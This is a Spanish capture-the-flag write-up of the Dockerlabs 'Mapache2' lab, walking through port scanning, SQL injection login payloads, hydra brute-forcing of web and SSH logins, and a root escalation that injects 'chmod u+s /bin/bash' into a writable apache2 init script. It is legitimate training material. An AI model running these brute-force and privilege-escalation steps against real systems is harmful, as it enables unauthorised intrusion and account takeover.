
# Writeup Template: Maquina `[ Mapache2 ]`

- Tags: #Mapache2 #cwle #Apache2
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Mapache2](https://mega.nz/file/6ZkFnbiB#N1Q3tz67fGqAfmauzPJ2LDUURPwZWhmTFPqwoqdAX9w)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x mapache2.zip
sudo bash auto_deploy.sh mapache2.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,3306 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
3306/tcp open  mysql?
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/login.php: Possible admin folder
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	Sin reporte:

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 3481]
/login.php            (Status: 200) [Size: 883]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> index.html]
```

Tenemos un panel de inicio de sesion que probaremos si es vulnerable a **SQLInjection**
```bash
http://172.17.0.2/login.php
```

**SQL** queries probadas:
```bash
'
admin'
admin' or 1=1-- -
admin' or '1'='1-- -
admin' or '1'='1
admin\'
admin'-- -
admin'#
admin AND 1=0-- -
admin' or sleep(5)-- -
```

Revisando el puerto de **mysql** podemos ver que existe un usuario **medusa**:
```bash
http://172.17.0.2:3306/
```

Ahora vemos lo siguiente:
```bash
We have to change this, I told Medusa to protect this more.
```

Al parecer no es vulnerable, Pero podemos realizar un diccionario personalizado con las palabras de la web de la siguiente manera:
```bash
cewl http://172.17.0.2 -w diccionario.txt
```
### Credenciales Encontradas
Ahora lanzamos el ataque al panel de inicio de sesion:
```bash
hydra -l medusa -P diccionario.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials" -t 4 -f
```

Tenemos credenciales:
```bash
[80][http-post-form] host: 172.17.0.2   login: medusa   password: enthusiasts
```

Ahora nos logueamos con las credenciales para ganar acceso al panel:
```bash
http://172.17.0.2/page_super_secure/secret.php
```

Verificamos si existen parametros:
```bash
wfuzz -c -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/page_super_secure/secret.php?FUZZ=../../../../etc/passwd" -H "Cookie: PHPSESSID=vbkgg8bfd5qievkqdpp7acmssj" --hl=102
```

Revisando el codigo fuente: desde el **modoDesarrollador** tenemos el siguiente comentario:
```bash
 I hope my boss doesn't kill me, but I tell kinder what a mess medusa made with the message from the port. 
```

Tenemos otro posible usuario: **kinder** asi que despues de probar para el panel de login:
```bash
hydra -l kinder -P diccionario.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials" -t 4 -f
```

Ahora probamos este mismo usuario para **ssh**
```bash
hydra -l kinder -P diccionario.txt -t 4 -f ssh://172.17.0.2
```

Ahora probamos con el diccionari **rockyou**:
```bash
hydra -l Kinder -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -I
```


---
## Explotacion de Vulnerabilidades

### Intrusion
Ahora que tenemos las credenciales nos conectaremos por ssh
```bash
[22][ssh] host: 172.17.0.2   login: Kinder   password: medusa
```

```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh Kinder@172.17.0.2
```

---

## Escalada de Privilegios

###### Usuario `[ Kinder ]`:
Listando los permisos para este usuario tenemos lo siguiente:
```bash
sudo -l

User Kinder may run the following commands on 5f1c5e63ed24:
    (ALL : ALL) NOPASSWD: /usr/sbin/service apache2 restart
```

Como podemos **reiniciar** el servicio de **apache2** nos aprovecharemos para modificar archivos de este servicio:
```bash
find / -iname "apache2*" 2>/dev/null
```

Tenemos estos archivos:
```bash
/etc/init.d/apache2
/etc/apache2
/etc/apache2/apache2.conf
```

Ahora intentaremos inyectar una instruccion maliciosa que sera ejecutada por el usuario **root** el cual nos permitira ganar acceso como este usuario:
Si nos dirigimos a la ruta de esta archivo:
```bash
/etc/init.d
```

Este archivo vemos que tiene capacidad de escritura: 
```bash
-rwxrwxrwx  1 root root 8141 Aug 23  2024 apache2
```

Nos aprovecharemos de esto para aqui en este archivo inyectar codigo malicioso:
```bash
chmod u+s /bin/bash
```

Una ves inyectada esta linea procedemos a reiniciar el servico para que sea ejecutada nuestra instruccion:
```bash
sudo -u root /usr/sbin/service apache2 restart
```

Hemos logrado asignar persmisos **SUID** a la **bash** de **root**
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ahora explotamos el privilegio:
```bash
# Comando para escalar al usuario: ( root )
 bash -p
```

---

## Evidencia de Compromiso
Flags **root**
```bash
ls -la /root
-rw-r--r--  1 root root   33 Aug 23  2024 root.txt
```

```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```